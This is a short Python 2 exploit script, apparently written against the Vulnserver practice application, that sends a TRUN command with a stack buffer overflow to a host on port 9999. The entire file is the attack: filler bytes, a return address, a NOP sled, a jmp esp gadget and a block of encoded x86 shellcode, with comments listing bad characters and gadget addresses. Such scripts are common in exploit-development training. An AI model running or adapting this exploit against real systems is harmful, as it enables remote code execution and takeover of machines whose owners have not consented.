#!/usr/bin/python

import socket

shellcode = ("\xdb\xd2\xd9\x74\x24\xf4\xbb\x08\xf8\xf0\xaa\x5a\x2b\xc9\xb1"
"\x31\x31\x5a\x18\x83\xea\xfc\x03\x5a\x1c\x1a\x05\x56\xf4\x58"
"\xe6\xa7\x04\x3d\x6e\x42\x35\x7d\x14\x06\x65\x4d\x5e\x4a\x89"
"\x26\x32\x7f\x1a\x4a\x9b\x70\xab\xe1\xfd\xbf\x2c\x59\x3d\xa1"
"\xae\xa0\x12\x01\x8f\x6a\x67\x40\xc8\x97\x8a\x10\x81\xdc\x39"
"\x85\xa6\xa9\x81\x2e\xf4\x3c\x82\xd3\x4c\x3e\xa3\x45\xc7\x19"
"\x63\x67\x04\x12\x2a\x7f\x49\x1f\xe4\xf4\xb9\xeb\xf7\xdc\xf0"
"\x14\x5b\x21\x3d\xe7\xa5\x65\xf9\x18\xd0\x9f\xfa\xa5\xe3\x5b"
"\x81\x71\x61\x78\x21\xf1\xd1\xa4\xd0\xd6\x84\x2f\xde\x93\xc3"
"\x68\xc2\x22\x07\x03\xfe\xaf\xa6\xc4\x77\xeb\x8c\xc0\xdc\xaf"
"\xad\x51\xb8\x1e\xd1\x82\x63\xfe\x77\xc8\x89\xeb\x05\x93\xc7"
"\xea\x98\xa9\xa5\xed\xa2\xb1\x99\x85\x93\x3a\x76\xd1\x2b\xe9"
"\x33\x2d\x66\xb0\x15\xa6\x2f\x20\x24\xab\xcf\x9e\x6a\xd2\x53"
"\x2b\x12\x21\x4b\x5e\x17\x6d\xcb\xb2\x65\xfe\xbe\xb4\xda\xff"
"\xea\xd6\xbd\x93\x77\x37\x58\x14\x1d\x47")

jumpesp = "\xaf\x11\x50\x62" 


#Badchar = \x00\x0a\x0d
#call esp address: 7C836B80
# pop pop ret = pop eax | pop ebp | ret = 625011B3
# jmp esp = 625011AF = \xaf\x11\x50\x62

buff = "TRUN /.:/" #command to be sent
buff += "A" * 2003 + "\xb3\x11\x50\x62" + "\x90" * 8  + jumpesp + "\x90" * 20 + shellcode + "C" * (5000-2003-949-20)


s = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) # creating the socket
s.connect(("192.168.0.156",9999)) #connect to the target
print s.recv(1024) #print response
s.send(buff) #send the stage
s.close() #close socket
